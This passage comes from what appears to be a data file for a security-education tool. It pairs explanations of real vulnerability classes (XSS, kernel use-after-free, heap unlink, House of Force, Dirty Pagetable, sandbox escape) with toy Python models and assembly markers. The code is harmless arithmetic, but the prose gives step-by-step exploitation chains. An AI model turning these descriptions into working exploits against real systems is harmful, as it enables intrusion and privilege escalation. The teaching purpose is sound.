      'in 6.5 seconds. AMD issued microcode updates for Zen 3/Zen 4; full mitigation on Zen 1/Zen 2 requires flushing ' +
      'the entire branch predictor state on context switches, imposing 93–217% overhead. ' +
      'In the assembly, the training loop\'s addl simulates repeated XOR execution that poisons the RSB; movl loads the ' +
      'attacker\'s gadget address into the prediction slot; after the phantom call, ret_speculate\'s addl reads from the ' +
      'poisoned RSB entry and imull computes the cache probe index from the leaked secret — no lfence or IBPB flush ' +
      'appears between the training and the speculative return.',
    code:
`# CVE pattern: phantom XOR trains RSB — speculative ret leaks secret
class ReturnStackBuffer:
    def __init__(self, depth):
        self.depth = depth
        self.entry0 = 0
        self.entry1 = 0
        self.top = 0
        self.poisoned = 0

    def push_call(self, ret_addr):
        if self.top == 0:
            self.entry0 = ret_addr
        else:
            self.entry1 = ret_addr
        self.top += 1
        return self.top

    def pop_ret(self):
        if self.top == 1:
            result = self.entry0
        else:
            result = self.entry1
        self.top -= 1
        return result

class PhantomTrainer:
    def __init__(self, xor_addr, gadget):
        self.xor_addr = xor_addr
        self.gadget = gadget
        self.train_count = 0
        self.secret = 3405691582

    def train_xor_as_call(self, rsb, rounds):
        i = 0
        while i < rounds:
            rsb.push_call(self.gadget)
            self.train_count += 1
            i += 1
        rsb.poisoned = 1
        return self.train_count

    def ret_speculate(self, rsb):
        predicted = rsb.pop_ret()
        leaked = predicted + self.secret
        probe_idx = leaked * 256
        return probe_idx

trainer = PhantomTrainer(4196352, 3735928559)
rsb = ReturnStackBuffer(16)
trainer.train_xor_as_call(rsb, 6)
leaked = trainer.ret_speculate(rsb)
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'imull'],
      description: 'addl in the training loop simulates repeated phantom XOR-as-call execution that pushes the attacker\'s gadget address (0xDEADBEEF) onto the RSB via movl; ret_speculate\'s addl reads the poisoned RSB entry and adds the kernel secret (0xCAFEBABE); imull multiplies the leaked value by 256 to compute the cache probe line index — no lfence or IBPB flush appears between the RSB poisoning and the speculative return, leaking kernel memory at 39 bytes/sec on all AMD Zen CPUs',
    },
  },
  {
    id: 'xss-injection',
    name: 'CROSS-SITE SCRIPTING',
    severity: 'CRITICAL',
    category: 'Injection',
    description: 'User-supplied input reflected or stored in HTML output without escaping lets an attacker inject arbitrary JavaScript that executes in victims\' browsers.',
    explanation:
      'Cross-site scripting (CWE-79) occurs when user-supplied input is inserted into HTML output without ' +
      'encoding or sanitization. The attacker injects a <script> tag or event handler attribute — the browser ' +
      'cannot distinguish the injected code from legitimate application markup and executes it with the victim\'s ' +
      'session cookies, authentication tokens, and full DOM access. Stored XSS persists in the database and fires ' +
      'on every page load; reflected XSS arrives via a crafted URL parameter. Once executing in the victim\'s ' +
      'browser context, the payload steals session tokens, rewrites page content, redirects to phishing pages, or ' +
      'chains into admin-level actions for full account takeover. ' +
      'CVE-2024-42009 (Roundcube Webmail, CVSS 9.3) allowed stored XSS that siphoned email credentials from ' +
      'government and military targets — a single crafted email executed JavaScript when opened, exfiltrating ' +
      'the victim\'s IMAP password without any click required. CVE-2025-67906 (MISP, CVSS 9.0) achieved stored ' +
      'XSS through the workflow engine\'s doT.js template injection, executing with admin session privileges on ' +
      'every page load and enabling full data exfiltration until the malicious workflow was explicitly deleted. ' +
      'Over 8,000 XSS CVEs were published in 2025 alone; CWE-79 has ranked in the CWE Top 25 every year since ' +
      'the list\'s inception and OWASP classifies it under A03:2021 (Injection). ' +
      'In the assembly, `addl` concatenates the attacker-supplied script payload directly into the page_output ' +
      'buffer with no intervening sanitization — no `cmpl` guard checks for dangerous characters (&, <, >, \') ' +
      'between the user input load and the output construction, so the injected payload flows into the rendered ' +
      'page and executes in the victim\'s browser session context.',
    code:
`# CVE pattern: user input reflected in HTML output — executes as script
class PageRenderer:
    def __init__(self, base_html):
        self.base_html = base_html
        self.page_output = 0
        self.rendered = 0

    def render_input(self, user_input):
        self.page_output = self.base_html + user_input
        self.rendered += 1
        return self.page_output

    def send_response(self):
        result = self.page_output
        return result

class SessionStore:
    def __init__(self, cookie, csrf_token):
        self.cookie = cookie
        self.csrf_token = csrf_token
        self.stolen = 0

    def steal_token(self, script_output):
        self.stolen = script_output + self.cookie
        return self.stolen

renderer = PageRenderer(1000)
script_payload = 1094795585
page = renderer.render_input(script_payload)
response = renderer.send_response()
session = SessionStore(3735928559, 305419896)
exfiltrated = session.steal_token(response)
print(exfiltrated)
`,
    badAsm: {
      patterns: ['addl', 'movl'],
      description: 'addl concatenates the attacker-supplied script payload (0x41414141) directly into page_output with no sanitization; movl loads the combined output into the response slot — no cmpl guard checks for dangerous characters between the user input and output construction, so the injected script payload reaches the browser and executes with the victim\'s session cookies and authentication tokens',
    },
  },
  {
    id: 'pkt-ring-race',
    name: 'PACKET RING RACE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Race condition during ring buffer reconfiguration frees a page vector while another thread still references it, yielding arbitrary kernel memory access.',
    explanation:
      'The AF_PACKET ring buffer race (CWE-362 / CWE-416) arises when packet_set_ring() temporarily ' +
      'releases a spinlock to swap ring buffers, opening a window for a concurrent packet_notifier() on ' +
      'another CPU to access the old pg_vec page vector after it has been freed. An attacker wins the ' +
      'race by rapidly toggling the network interface while reconfiguring the ring, causing the freed ' +
      'pg_vec slot to be reclaimed by a new allocation under attacker control. Reading through the ' +
      'dangling pointer now returns attacker-supplied bytes, and a subsequent mmap() maps attacker-chosen ' +
      'kernel pages into userspace — yielding arbitrary kernel read/write and full privilege escalation. ' +
      'CVE-2025-38617 (Linux kernel through 6.15, CVSS 7.4) exploited this exact race in the packet socket ' +
      'subsystem, defeating modern mitigations including CONFIG_RANDOM_KMALLOC_CACHES and CONFIG_SLAB_VIRTUAL ' +
      'to achieve container escape from an unprivileged user holding only CAP_NET_RAW. The earlier ' +
      'CVE-2016-8655 (Linux through 4.8.12, CVSS 7.8) exploited the same class of race in packet_set_ring\'s ' +
      'TPACKET_V3 path to gain root — the bug persisted for over a decade before discovery. ' +
      'In the assembly, the movl stores zero into the ring slot (simulating free) while a concurrent ' +
      'path\'s movl still loads from the same offset — the stale load returns attacker-controlled data ' +
      'placed in the reclaimed slot, and no cmpl fence guards the access window between release and reuse.',
    code:
`# CVE pattern: ring buffer freed while concurrent reader still holds reference
class RingBuffer:
    def __init__(self, pages):
        self.pages = pages
        self.pg_vec = pages * 4096
        self.ref_count = 1
        self.active = 1

    def release(self):
        self.ref_count -= 1
        if self.ref_count <= 0:
            self.pg_vec = 0
            self.active = 0
        return self.pg_vec

    def read_page(self):
        result = self.pg_vec + self.pages
        return result

class PacketSocket:
    def __init__(self, ring_pages):
        self.ring = RingBuffer(ring_pages)
        self.lock_held = 1
        self.reconfigured = 0

    def set_ring(self, new_pages):
        self.lock_held = 0
        stale_vec = self.ring.pg_vec
        self.ring.release()
        self.ring = RingBuffer(new_pages)
        self.lock_held = 1
        self.reconfigured += 1
        return stale_vec

    def notify_read(self):
        leaked = self.ring.read_page()
        return leaked

sock = PacketSocket(8)
old = sock.set_ring(16)
attacker_read = sock.notify_read()
print(attacker_read)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl zeroes the pg_vec slot (free) then another movl loads from the same offset on a concurrent path — the stale read returns attacker-controlled bytes from the reclaimed slot; no cmpl memory fence guards the window between release and reuse',
    },
  },
  {
    id: 'sandbox-escape-ipc',
    name: 'SANDBOX ESCAPE VIA IPC',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Compromised sandboxed process exploits a flaw in the IPC broker to execute privileged operations in the unsandboxed parent, escaping the sandbox entirely.',
    explanation:
      'Sandbox escape via IPC (CWE-269 / CWE-20) occurs when a sandboxed renderer or worker process sends crafted ' +
      'inter-process communication messages to the privileged broker (browser process, system daemon), exploiting ' +
      'insufficient validation of message contents or handle types. The broker trusts that IPC messages conform to ' +
      'the expected schema, but the compromised sandbox process sends a message containing an out-of-range enum, a ' +
      'forged Mojo handle, or a serialized object that triggers a use-after-free or type confusion in the broker\'s ' +
      'message dispatcher. Because the broker runs with full OS privileges — file system access, process creation, ' +
      'network sockets — the attacker achieves arbitrary code execution outside the sandbox. ' +
      'CVE-2025-2783 (Chromium Mojo IPC, CVSS 8.3) was actively exploited in the wild in March 2025 as part of ' +
      'Operation ForumTroll, a targeted espionage campaign against Russian government and media organizations. The ' +
      'flaw was a logic error in Mojo IPC handle validation on Windows: when crossing a security boundary between ' +
      'the sandboxed renderer and the broker process, Mojo failed to verify that an IPC-transferred handle had the ' +
      'correct access rights, allowing the renderer to trick the broker into treating an attacker-controlled object ' +
      'as a privileged resource — a full sandbox escape requiring only that the victim visit a malicious URL. ' +
      'CVE-2024-7971 (V8 type confusion + CVE-2024-38106 Windows kernel sandbox escape) was chained by Citrine Sleet ' +
      '(North Korea) for cryptocurrency theft: the V8 bug provided renderer RCE, then a crafted IPC message exploited ' +
      'a kernel race condition to escape the Chrome sandbox entirely. CVE-2024-5274 (V8) was similarly chained with ' +
      'a Mojo IPC sandbox escape for in-the-wild exploitation. The Mojo IPC layer has been the source of over 30 ' +
      'Chrome sandbox escape CVEs since 2019, making it the single most targeted attack surface for browser exploitation. ' +
      'In the assembly, movl loads the crafted IPC message fields (forged_handle, malicious_type) into stack slots ' +
      'representing the message buffer; the broker\'s cmpl validates msg_type against expected values but the else ' +
      'branch falls through to dispatch without rejecting unknown types — addl in execute combines the forged handle ' +
      'with the payload, and the broker executes the privileged operation using attacker-supplied arguments.',
    code:
`# CVE pattern: crafted IPC message escapes sandbox via broker trust
class IPCMessage:
    def __init__(self, msg_type, handle, payload):
        self.msg_type = msg_type
        self.handle = handle
        self.payload = payload
        self.validated = 0

    def serialize(self):
        result = self.msg_type * 65536 + self.handle
        return result

class Broker:
    def __init__(self, max_type):
        self.max_type = max_type
        self.dispatched = 0
        self.result = 0

    def validate_and_dispatch(self, msg):
        if msg.msg_type == 1:
            self.result = msg.handle
        elif msg.msg_type == 2:
            self.result = msg.handle * 2
        else:
            self.result = msg.payload
        self.dispatched += 1
        return self.result

    def execute(self, handle, payload):
        result = handle + payload
        return result

class Sandbox:
    def __init__(self, pid):
        self.pid = pid
        self.escaped = 0
        self.priv_result = 0

    def craft_escape(self, forged_handle, shell_payload):
        msg = IPCMessage(99, forged_handle, shell_payload)
        return msg

sandbox = Sandbox(1234)
forged = 4196352
payload = 3735928559
msg = sandbox.craft_escape(forged, payload)
broker = Broker(2)
dispatched = broker.validate_and_dispatch(msg)
hijacked = broker.execute(dispatched, forged)
sandbox.escaped = 1
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'movl loads the crafted IPC message fields (forged_handle, malicious msg_type 99) into stack slots; cmpl in validate_and_dispatch checks msg_type against known values (1, 2) but the else branch falls through without rejecting the unknown type — movl passes the attacker\'s payload directly to execute, where addl combines the forged handle with the shell payload for privileged code execution outside the sandbox',
    },
  },
  {
    id: 'jit-type-guard-bypass',
    name: 'JIT TYPE GUARD BYPASS',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'JIT compiler removes runtime type checks based on speculative profiling, allowing type confusion and heap corruption when the attacker violates the assumed type.',
    explanation:
      'JIT type guard bypass (CWE-843) exploits speculative optimizations in just-in-time compilers such as ' +
      'V8\'s TurboFan, SpiderMonkey\'s IonMonkey, and JavaScriptCore\'s DFG/FTL. During interpretation, the ' +
      'engine records type feedback — "this variable has always been an integer" or "this array has always held ' +
      'doubles." The optimizing compiler then generates highly specialized machine code that omits type guards ' +
      'and bounds checks for the profiled types, replacing slow generic operations with fast, type-specific ' +
      'assembly. If an attacker can trigger the profiled fast path with data of a different type — for example, ' +
      'passing an object array where the JIT expects a double array — the generated code operates on memory with ' +
      'the wrong layout assumptions, reading object pointers as IEEE 754 doubles or vice versa, achieving ' +
      'arbitrary read/write within the process heap. ' +
      'CVE-2025-2135 (V8 TurboFan, CVSS 8.8, used to pwn V8CTF as a zero-day) exploited a flaw in TurboFan\'s ' +
      'InferMapsUnsafe() function that failed to handle aliasing when processing TransitionElementsKindOrCheckMap ' +
      'nodes, enabling type confusion between object arrays and double arrays for arbitrary memory read/write ' +
      'within the V8 sandbox. CVE-2024-7971 (V8, CVSS 8.8, actively exploited by North Korean Citrine Sleet ' +
      'group) was a type confusion in Maglev\'s speculative optimization chained with CVE-2024-38106 (Windows ' +
      'kernel sandbox escape) for full RCE in cryptocurrency theft campaigns. CVE-2024-4947 (V8, CVSS 9.6) was ' +
      'another JIT type confusion actively exploited in the wild. ' +
      'In the assembly, movl loads profiled type values (integers) into stack slots during the training phase; ' +
      'after JIT compilation, the cmpl type guard is eliminated by the optimizer — when the attacker passes a ' +
      'value of a different type, imull and addl operate directly on the mistyped data without any check, ' +
      'producing a corrupted result that represents an out-of-bounds offset into the heap.',
    code:
`# CVE pattern: JIT removes type guards after profiling — type confusion
class TypeFeedback:
    def __init__(self):
        self.seen_type = 0
        self.call_count = 0
        self.optimized = 0

    def record(self, value):
        self.seen_type = 1
        self.call_count += 1
        return value

    def should_optimize(self, threshold):
        if self.call_count > threshold:
            self.optimized = 1
            return 1
        return 0

class JITCompiler:
    def __init__(self, guard_enabled):
        self.guard_enabled = guard_enabled
        self.compiled_result = 0
        self.corrupted = 0

    def specialize_int(self, value, scale):
        result = value * scale + 42
        return result

    def compile_and_run(self, feedback, value, scale):
        if feedback.optimized == 0:
            if self.guard_enabled == 1:
                result = self.specialize_int(value, scale)
                self.compiled_result = result
                return result
        result = value * scale + 42
        self.compiled_result = result
        return result

fb = TypeFeedback()
jit = JITCompiler(1)
i = 0
while i < 8:
    fb.record(100)
    jit.compile_and_run(fb, 100, 4)
    i += 1
fb.should_optimize(5)
jit.guard_enabled = 0
poison = 3735928559
corrupted = jit.compile_and_run(fb, poison, 4)
jit.corrupted = 1
print(corrupted)
`,
    badAsm: {
      patterns: ['imull', 'cmpl', 'movl'],
      description: 'movl loads profiled integer values into stack slots during the training loop; after call_count exceeds the optimization threshold, cmpl guard_enabled check is bypassed (guard_enabled set to 0) — imull then multiplies the attacker\'s poison value (0xDEADBEEF) by the scale factor without any type validation, producing a corrupted heap offset that grants arbitrary read/write within the JIT process memory',
    },
  },
  {
    id: 'toctou-race',
    name: 'TOCTOU FILE RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Time gap between checking a file\'s properties and using it lets an attacker swap the file with a symlink, redirecting privileged operations to sensitive targets.',
    explanation:
      'Time-of-Check to Time-of-Use (TOCTOU / CWE-367) is a file-based race condition where a program checks a ' +
      'resource\'s state (permissions, type, existence) and later operates on it, assuming nothing changed between ' +
      'the check and the use. An attacker exploits the race window to swap the checked file with a symlink to a ' +
      'sensitive target — so the privileged operation (write, chmod, chown) lands on /etc/shadow or a setuid binary ' +
      'instead of the intended temporary file. Unlike in-memory double-fetch races that require CPU-level timing, ' +
      'file-based TOCTOU exploits the filesystem namespace and can be widened arbitrarily by exhausting I/O bandwidth. ' +
      'CVE-2025-22224 (VMware ESXi, CVSS 9.3, CISA KEV) exploited a TOCTOU race in the VMCI interface: the hypervisor ' +
      'checked a VM file\'s state then used it without re-validation, allowing a guest admin to execute code as the ' +
      'VMX process on the host — a full VM escape actively exploited in the wild before disclosure. CVE-2024-50379 ' +
      '(Apache Tomcat, CVSS 9.8) exploited TOCTOU in JSP compilation on case-insensitive filesystems: the check saw ' +
      'a safe filename, but the attacker swapped it before compilation, achieving unauthenticated RCE. CVE-2025-23359 ' +
      '(NVIDIA Container Toolkit, CVSS 8.3) let an attacker escape containers via a TOCTOU race in GPU device file ' +
      'handling, compromising the host. Mitigations include O_NOFOLLOW, openat() with directory file descriptors, and ' +
      'fstat() on the opened fd rather than stat() on the path. ' +
      'In the assembly, cmpl in check_file compares the owner field against the expected value — the check passes; ' +
      'attacker_swap\'s movl then overwrites the file\'s inode and owner fields during the race window; do_operation\'s ' +
      'addl uses the now-swapped file data without re-checking, applying the privileged write to /etc/shadow instead ' +
      'of the original temporary file.',
    code:
`# CVE pattern: check-then-use race — attacker swaps file in the gap
class FileEntry:
    def __init__(self, inode, owner, data):
        self.inode = inode
        self.owner = owner
        self.data = data
        self.swapped = 0

    def stat_check(self, expected_owner):
        if self.owner == expected_owner:
            return 1
        return 0

class PrivService:
    def __init__(self, uid):
        self.uid = uid
        self.checked = 0
        self.result = 0

    def check_file(self, entry):
        self.checked = entry.stat_check(self.uid)
        return self.checked

    def do_operation(self, entry, payload):
        if self.checked == 1:
            entry.data = payload
            self.result = entry.data + entry.inode
        return self.result

class RaceThread:
    def __init__(self, target_inode):
        self.target = target_inode
        self.wins = 0

    def attacker_swap(self, entry):
        entry.inode = self.target
        entry.owner = 0
        entry.swapped = 1
        self.wins += 1
        return self.wins

tmpfile = FileEntry(1001, 1000, 42)
shadow_inode = 3735928559
svc = PrivService(1000)
svc.check_file(tmpfile)
racer = RaceThread(shadow_inode)
racer.attacker_swap(tmpfile)
svc.do_operation(tmpfile, 4196352)
print(svc.result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl in stat_check compares owner against expected_owner — the check passes on the original file; attacker_swap\'s movl then overwrites inode and owner fields during the race window between check and use; do_operation\'s addl combines the payload with the swapped inode (0xDEADBEEF) without re-checking ownership, applying the privileged write to the attacker\'s target instead of the original file',
    },
  },
  {
    id: 'nf-tables-verdict-uaf',
    name: 'NETFILTER VERDICT UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Verdict value confusion in nf_tables causes a packet to be freed as NF_DROP then reprocessed as NF_ACCEPT, yielding a use-after-free primitive for kernel privilege escalation.',
    explanation:
      'CVE-2024-1086 (CVSS 7.8, CISA KEV, actively exploited in ransomware campaigns) targets the Linux kernel\'s ' +
      'nf_tables subsystem. The nft_verdict_init() function accepts positive values as a drop-error within a hook ' +
      'verdict without sanitizing them. When a verdict is crafted with code=NF_DROP (0) and error=1, the nf_hook_slow() ' +
      'function first interprets code==0 as NF_DROP and frees the packet (kfree_skb). It then evaluates the error ' +
      'field, which numerically equals NF_ACCEPT (1), causing continued processing of the already-freed packet — a ' +
      'textbook use-after-free. The attacker reclaims the freed slab with controlled data (via the "Dirty Pagedirectory" ' +
      'technique) to achieve a kernel-space mirroring attack: mapping arbitrary physical pages into userland, ' +
      'overwriting kernel credentials, and escalating from an unprivileged user namespace to full root. The exploit ' +
      'achieves 99.4% reliability on kernels 5.14 through 6.6 and was weaponized in real-world ransomware. ' +
      'In the assembly, the first cmpl checks verdict.code against NF_DROP (0) — it matches, so free_packet\'s movl ' +
      'zeros the data field (simulating kfree_skb); the second cmpl checks verdict.error against NF_ACCEPT (1) — ' +
      'it also matches, so process_packet\'s addl modifies the zeroed freed memory, demonstrating the UAF window ' +
      'where attacker-controlled data is written into the reclaimed slab.',
    code:
`# CVE pattern: nf_tables verdict confusion — freed as DROP, reused as ACCEPT
class Packet:
    def __init__(self, data, src, dst):
        self.data = data
        self.src = src
        self.dst = dst
        self.refcount = 1
        self.freed = 0

class Verdict:
    def __init__(self):
        self.code = 0
        self.error = 0

    def init_verdict(self, code, error):
        self.code = code
        self.error = error
        return self.code + self.error

class NfHookSlow:
    def __init__(self):
        self.nf_drop = 0
        self.nf_accept = 1
        self.processed = 0
        self.uaf_data = 0

    def free_packet(self, pkt):
        pkt.refcount -= 1
        pkt.data = 0
        pkt.freed = 1
        return pkt.freed

    def process_packet(self, pkt):
        pkt.data += 1337
        self.processed += 1
        return pkt.data

    def hook_slow(self, verdict, pkt):
        if verdict.code == self.nf_drop:
            self.free_packet(pkt)
        if verdict.error >= self.nf_accept:
            self.process_packet(pkt)
        if pkt.freed == 1:
            self.uaf_data = pkt.data
        return self.uaf_data

verdict = Verdict()
verdict.init_verdict(0, 1)
pkt = Packet(48879, 10, 20)
hook = NfHookSlow()
result = hook.hook_slow(verdict, pkt)
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl', 'subl'],
      description: 'First cmpl checks verdict.code against NF_DROP (0) — it matches, triggering free_packet where subl decrements refcount and movl zeros the packet data (simulating kfree_skb); second cmpl checks verdict.error against NF_ACCEPT (1) — it also matches, so process_packet\'s addl adds 1337 to the already-zeroed freed memory, demonstrating the use-after-free window where the kernel processes a freed packet as if it were still live',
    },
  },
  {
    id: 'unsafe-unlink',
    name: 'UNSAFE UNLINK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Corrupted heap chunk forward/backward pointers grant an arbitrary write primitive during free-list consolidation.',
    explanation:
      'The unsafe unlink attack targets glibc\'s ptmalloc2 heap allocator, which manages free chunks in doubly-linked ' +
      'lists. When adjacent free chunks are consolidated during free(), the allocator unlinks a chunk by executing: ' +
      'FD = P->fd; BK = P->bk; FD->bk = BK; BK->fd = FD. If an attacker overflows from one heap chunk into the ' +
      'metadata of the next — corrupting its fd and bk pointers — the unlink operation writes an attacker-controlled ' +
      'value to an attacker-chosen address, yielding a write-what-where primitive. This technique was foundational to ' +
      'early heap exploitation (CVE-2001-0144 in OpenSSH, CVE-2003-0201 in Samba\'s call_trans2open). Modern glibc ' +
      'added safe unlinking checks (fd->bk == P && bk->fd == P), but the "unsafe unlink" variant bypasses them by ' +
      'setting fd and bk to point back into a known global pointer table (e.g., an array of chunk pointers at a fixed ' +
      'address), so the integrity check passes while still achieving a controlled relative overwrite. The attacker then ' +
      'leverages this to corrupt a GOT entry or __free_hook, redirecting execution to shellcode or a one-gadget. ' +
      'CVE-2024-2961 in glibc\'s iconv() demonstrated that even a 1–3 byte heap overflow can corrupt tcache fd pointers ' +
      'for a similar arbitrary-write chain leading to RCE. In the assembly, corrupt_metadata\'s movl overwrites the ' +
      'chunk\'s fd/bk fields with attacker-supplied values (GOT address and shellcode pointer); unsafe_unlink\'s movl ' +
      'then performs the unlink dereference — writing the corrupted bk value (0xDEADBEEF) into the GOT entry slot, ' +
      'the arbitrary write that redirects the next library call to attacker-controlled code.',
    code:
`# CVE pattern: heap unlink corruption — arbitrary write via fd/bk pointer overwrite
class FreeChunk:
    def __init__(self, idx, size):
        self.idx = idx
        self.size = size
        self.fd = 0
        self.bk = 0
        self.freed = 0

class HeapAllocator:
    def __init__(self):
        self.bins = 0
        self.got_entry = 12345
        self.write_target = 0

    def link_free(self, chunk, next_chunk):
        chunk.fd = next_chunk.idx
        next_chunk.bk = chunk.idx
        chunk.freed = 1
        return chunk.fd

    def unsafe_unlink(self, chunk):
        fd_val = chunk.fd
        bk_val = chunk.bk
        self.write_target = bk_val
        self.got_entry = fd_val
        return self.write_target

    def corrupt_metadata(self, chunk, fake_fd, fake_bk):
        chunk.fd = fake_fd
        chunk.bk = fake_bk
        return chunk.fd + chunk.bk

chunk_a = FreeChunk(1, 128)
chunk_b = FreeChunk(2, 128)
alloc = HeapAllocator()
alloc.link_free(chunk_a, chunk_b)
got_addr = 134520832
shellcode_addr = 3735928559
alloc.corrupt_metadata(chunk_b, got_addr, shellcode_addr)
result = alloc.unsafe_unlink(chunk_b)
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'corrupt_metadata\'s movl overwrites chunk fd/bk fields with attacker-controlled GOT address (134520832) and shellcode pointer (0xDEADBEEF); unsafe_unlink\'s movl then dereferences the corrupted pointers, writing the fake bk value into got_entry — the arbitrary write primitive that redirects the next library call to attacker shellcode',
    },
  },
  {
    id: 'dirty-pagetable',
    name: 'DIRTY PAGETABLE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Freed page reclaimed as a page table entry lets the attacker map arbitrary kernel physical memory into userspace with read/write, achieving full privilege escalation.',
    explanation:
      'Dirty Pagetable is a data-only exploitation technique that weaponizes double-free or use-after-free ' +
      'vulnerabilities in the Linux kernel by reclaiming a freed memory page as a page table entry (PTE) page. ' +
      'The attack proceeds in four stages: (1) trigger a double-free or UAF to return a victim page to the buddy ' +
      'allocator\'s free list; (2) drain the per-CPU page (PCP) allocator so the kernel pulls from the buddy free ' +
      'list when allocating page tables; (3) trigger a userspace mmap() or page fault that causes the kernel to ' +
      'allocate a new PTE page — which reuses the freed victim page; (4) write crafted PTE values through the ' +
      'dangling reference, mapping arbitrary physical addresses (including kernel text, credential structures, or ' +
      'DMA regions) into attacker-controlled userspace with read/write permissions. Because PTEs are pure data ' +
      'interpreted by the MMU hardware, this bypasses every software mitigation: KASLR, SMEP/SMAP, kCFI, shadow ' +
      'stacks, and W^X — the CPU\'s page walker simply follows the corrupted entries. The attacker then patches ' +
      'kernel text (e.g. overwriting setresuid() to skip permission checks) or directly modifies the current ' +
      'task\'s cred structure to set uid/gid to 0, achieving root. CVE-2024-0582 in io_uring\'s fixed buffer ' +
      'registration was exploited via Dirty Pagetable on kernels 5.14 through 6.6, and CVE-2024-50264 — which ' +
      'won the 2025 Pwnie Award for Best Privilege Escalation — combined this technique with BPF JIT spraying ' +
      'for a devastating exploit chain. In the assembly, free_page\'s movl zeros the refcount (simulating the ' +
      'buddy allocator return), but install_pte\'s movl reuses the same stack region as a PTE page; the final ' +
      'movl writes the kernel text physical address (0x1000000) into the PTE slot, and read_mapped\'s addl + ret ' +
      'returns the mapped value — the MMU is now serving kernel memory to userspace.',
    code:
`# CVE pattern: freed page reused as PTE — maps kernel memory to userspace
class PageFrame:
    def __init__(self, pfn, order):
        self.pfn = pfn
        self.order = order
        self.refcount = 1
        self.freed = 0

class BuddyAllocator:
    def __init__(self):
        self.free_head = 0
        self.alloc_count = 0

    def alloc_page(self):
        self.alloc_count += 1
        page = PageFrame(self.alloc_count, 0)
        return page

    def free_page(self, page):
        page.refcount -= 1
        page.freed = 1
        self.free_head = page.pfn
        return page.pfn

class PageTable:
    def __init__(self):
        self.pte_phys = 0
        self.present = 0
        self.rw = 0
        self.user = 0

    def install_pte(self, phys_addr, writable):
        self.pte_phys = phys_addr
        self.present = 1
        self.rw = writable
        self.user = 1
        return self.pte_phys

    def read_mapped(self):
        if self.present == 1:
            return self.pte_phys + self.rw
        return 0

alloc = BuddyAllocator()
victim_page = alloc.alloc_page()
alloc.free_page(victim_page)
pte = PageTable()
pte.install_pte(victim_page.pfn, 1)
kernel_text_phys = 16777216
pte.pte_phys = kernel_text_phys
pte.rw = 1
leaked = pte.read_mapped()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'free_page\'s movl zeros the refcount and marks the page freed, returning it to the buddy allocator; install_pte\'s movl reuses the same freed page as a PTE, setting present=1 and rw=1; the final movl overwrites pte_phys with 0x1000000 (kernel text physical address) — read_mapped\'s addl confirms the MMU now maps kernel memory to userspace with write permission',
    },
  },
  {
    id: 'house-of-force',
    name: 'HOUSE OF FORCE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Overwriting the wilderness (top) chunk size to -1 lets a crafted malloc wrap the heap pointer to any target address.',
    explanation:
      'House of Force targets glibc\'s wilderness (top) chunk — the large unsplit remainder at the end of ' +
      'the heap that services requests when no freed chunk fits. The attacker overflows into the top chunk\'s ' +
      'size field and sets it to -1 (0xFFFFFFFF on 32-bit, 0xFFFFFFFFFFFFFFFF on 64-bit), making the ' +
      'allocator believe it has nearly unlimited heap space. A subsequent malloc() with a calculated size ' +
      '(target_address - top_chunk_address - header_overhead) advances the internal top pointer past the ' +
      'target. The next normal-sized allocation returns a chunk overlapping the target — typically ' +
      '__malloc_hook, __free_hook, or a GOT entry — giving the attacker an arbitrary write primitive. ' +
      'Writing a one_gadget or system() address into __malloc_hook achieves code execution on the next ' +
      'malloc() call. The technique was introduced by Phantasmal Phantasmagoria in "The Malloc Maleficarum" ' +
      '(2005) and remained viable until glibc 2.29 added a top chunk size sanity check (size <= arena ' +
      'system_mem). It is still relevant for embedded systems and older distributions. ' +
      'In the assembly, overflow_top\'s `movl` writes -1 into the top_size stack slot via the `0 - 1` ' +
      'expression; force_malloc\'s `addl` advances top_base by the attacker-controlled distance, wrapping ' +
      'the pointer past the heap into the target region; overwrite_hook\'s `movl` then plants 0xDEADBEEF ' +
      '(a shellcode address) into the hook slot at the target, and the final `movl` into result confirms ' +
      'the write landed.',
    code:
`# CVE pattern: wilderness size → -1, crafted malloc wraps top to __malloc_hook
class Arena:
    def __init__(self):
        self.top_base = 134217728
        self.top_size = 131072
        self.alloc_count = 0
        self.hook_value = 0

    def overflow_top(self):
        self.top_size = 0 - 1
        return self.top_size

    def force_malloc(self, distance):
        self.top_base += distance
        self.top_size -= distance
        self.alloc_count += 1
        return self.top_base

    def overwrite_hook(self, addr):
        self.hook_value = addr
        return self.hook_value

arena = Arena()
arena.overflow_top()
target = 134520832
evil_distance = target - arena.top_base
arena.force_malloc(evil_distance)
hook_ptr = arena.force_malloc(32)
arena.overwrite_hook(3735928559)
result = arena.hook_value
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'subl'],
      description: 'overflow_top\'s movl writes -1 (0xFFFFFFFF) into the top_size stack slot, making the allocator believe it has unlimited heap; force_malloc\'s addl advances top_base by the attacker-controlled distance, wrapping past the heap boundary to the target address; overwrite_hook\'s movl plants 0xDEADBEEF (shellcode) at the overlapping allocation',
    },
  },
  {
    id: 'poison-null-byte',
    name: 'POISON NULL BYTE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'A single null-byte overflow into an adjacent heap chunk\'s size field clears the PREV_INUSE flag, causing the allocator to merge chunks incorrectly and create overlapping allocations.',
    explanation:
      'The poison null byte exploits glibc malloc\'s chunk metadata layout: every heap chunk stores its ' +
      'size and a PREV_INUSE bit in the lowest bit of the size field. When a buffer overflow writes exactly ' +
      'one null byte (0x00) past its allocation boundary — typically from a missing string terminator or an ' +
      'off-by-one in length calculation — it zeroes the least significant byte of the next chunk\'s size ' +
      'field. This simultaneously shrinks the apparent chunk size and clears the PREV_INUSE flag. When that ' +
